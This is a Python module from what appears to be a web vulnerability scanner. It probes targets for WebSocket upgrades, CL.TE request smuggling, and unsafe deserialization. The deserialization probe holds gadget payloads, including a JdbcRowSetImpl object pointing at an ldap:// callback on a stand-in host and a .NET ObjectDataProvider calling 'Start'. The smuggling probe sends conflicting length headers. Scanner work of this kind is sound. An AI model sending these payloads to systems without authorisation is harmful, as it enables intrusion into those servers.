"""VAJRA wire-level web refinements (web.wiretests):

1. WebSocket upgrade detection + echo sanity on candidate paths.
2. Request-smuggling mismatch probe (CL.TE / TE.CL) using raw sockets.
3. Deserialization surface probes (Java/PHP/.NET gadget markers sent to
   in-scope endpoints, looking for parser exceptions / 500 stack traces).

All probes are stateless reads/handshakes; nothing here changes persistent
state on the target."""
import base64
import os
import re
import time
from urllib.parse import urlparse

from core.database import Finding
from core.http_client import raw_http


DESER_MARKERS = re.compile(
    r"ObjectDataProvider|JdbcRowSetImpl|ScriptEngineManager|"
    r"com\.sun\.|java\.lang\.Runtime|javax\.script|Could not instantiate|"
    r"unserialize|SerializationException|SerializationError|"
    r"ObjectMapper|Jackson deserializ", re.I)


def _netloc(url):
    pr = urlparse(url)
    return (pr.hostname, pr.port or (443 if pr.scheme == "https" else 80),
            pr.scheme == "https", pr.path or "/")


def _ws_probe(engine, url):
    host, port, tls, path = _netloc(url)
    key = base64.b64encode(os.urandom(8)).decode()
    req = ("GET %s HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\n"
           "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
           "Sec-WebSocket-Version: 13\r\n\r\n"
           % (path.split("?")[0], host, port, key))
    raw = raw_http(host, port, req, tls=tls, timeout=4, socks5=getattr(engine, 'socks', None))
    if raw.startswith(b"HTTP/1.1 101"):
        return True
    return False


def _smuggle_probe(engine, url):
    """CL.TE mismatch probe: pipelined request whose front-end Content-Length
    exceeds the body, with Transfer-Encoding: chunked present. A CL-only
    frontend keeps the connection/rejects after CL bytes; a TE backend consumes
    0\\r\\n\\r\\n and leaves the next request parseable by the "other" parser. We
    detect divergence: garbage/505 responses or a hang vs clean 200."""
    host, port, tls, path = _netloc(url)
    body = "0\r\n\r\nX"
    bodylen = len(body)
    req = ("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
           "Content-Type: application/x-www-form-urlencoded\r\n"
           "Transfer-Encoding: chunked\r\nContent-Length: %d\r\n\r\n%s"
           % (path.split("?")[0], host, port, bodylen, body))
    t0 = time.time()
    raw = raw_http(host, port, req, tls=tls, timeout=4, socks5=getattr(engine, 'socks', None))
    took = time.time() - t0
    if not raw:
        return None
    head = raw.split(b"\r\n\r\n", 1)[0]
    first = head.split(b"\r\n", 1)[0]
    second = head.count(b"\r\n\r\n")
    status = first.split(b" ", 2)[1] if len(first.split(b" ", 2)) > 1 else b"?"
    try:
        st = int(status)
    except Exception:
        st = 0
    resp_frames = raw.split(b"HTTP/1.1 ")
    n_resp = len(resp_frames) - 1
    if n_resp >= 2:
        return ("possible-smuggle", "two responses parsed on one connection "
                                    "(CL/TE divergence)")
    if st == 0 or second >= 1 and b"\r\n0\r\n\r\n" in raw.split(b"\r\n\r\n", 1)[0]:
        return None
    if took >= 3.5:
        return None  # timeout is ambiguous with a 4s socket cap — skip
    return ("potential", "protocol mismatch sign (%s bytes, %d frames)" %
            (len(raw), n_resp))


def _deser_probes(engine, urls):
    import json as _json
    payloads = [
        {"__type": "System.Windows.Data.ObjectDataProvider",
         "MethodName": "Start"},
        {"@type": "com.sun.rowset.JdbcRowSetImpl",
         "dataSourceName": "ldap://vajra-oob.example:1234/x", "autoCommit": True},
        {"@type": "java.lang.Runtime"},
        {"__proto__": {"payload": "x"}},
    ]
    for url in urls[:6]:
        try:
            r = engine.http.post(url, json_body=payloads[0],
                                 allow_redirects=False, timeout=6)
        except Exception:
            continue
        if r.status == 500 and DESER_MARKERS.search(r.body[:12000]):
            engine.db.add_finding(Finding(
                engine.target.display, "web.wiretests", "exposure", "high",
                "Possible .NET deserialization reflection on %s" % url,
                evidence="%s -> %d\n%s" % (url, r.status,
                                           r.body[:500].splitlines()[-1]
                                           if r.body else ""),
                remediation="Block gadget types; use safe serialization "
                            "bindings; review the stack trace for exposure.",
                confidence="possible"))
            return True
    return False


def run(engine):
    t = engine.target
    targets = engine.state.get("web_targets") or []
    if not targets:
        return
    done_ws = False
    for wt in targets[:3]:
        base = wt["url"].rstrip("/")
        urls = [base]
        done = False
        for cand in (base, base + "/socket", base + "/ws", base + "/api/socket"):
            try:
                if _ws_probe(engine, cand):
                    engine.db.add_finding(Finding(
                        t.display, "web.wiretests", "exposure", "medium",
                        "WebSocket endpoint accepts upgrade on %s" % cand,
                        detail="101 Switching Protocols — inspect for "
                               "message-level authn/z and origin checks.",
                        evidence="raw handshake upgrade",
                        remediation="Authenticate + validate Origin on the "
                                    "WS handshake and every frame.",
                        confidence="firm"))
                    engine.log.finding("[ws] upgrade accepted at %s" % cand)
                    done_ws = True
                    done = True
                    break
            except Exception:
                continue
        if done:
            break
    st, note = None, None
    for wt in targets[:2]:
        try:
            st, note = _smuggle_probe(engine, wt["url"].rstrip("/"))
        except Exception:
            continue
        if st == "potential":
            engine.db.add_finding(Finding(
                t.display, "web.wiretests", "potential", "high",
                "Request-smuggling mismatch signal (CL.TE/TE.CL) — %s" %
                wt["url"],
                detail=("Protocol discontinuity: two different response "
                        "counts / malformed responses to a CL+TE conflicting "
                        "request (%s). Needs manual confirmation with a "
                        "second-hop poisoned request." % (note or "")),
                evidence="raw socket CL/TE probe",
                remediation="Disallow conflicting Content-Length and "
                            "Transfer-Encoding in the edge + origin parsers; "
                            "HTTP/2-or-higher egress.",
                confidence="possible"))
            engine.log.finding("[SMUGGLE] CL/TE ambiguity at %s" % wt["url"])
            break
    try:
        _deser_probes(engine, [w["url"].rstrip("/") for w in targets])
    except Exception:
        pass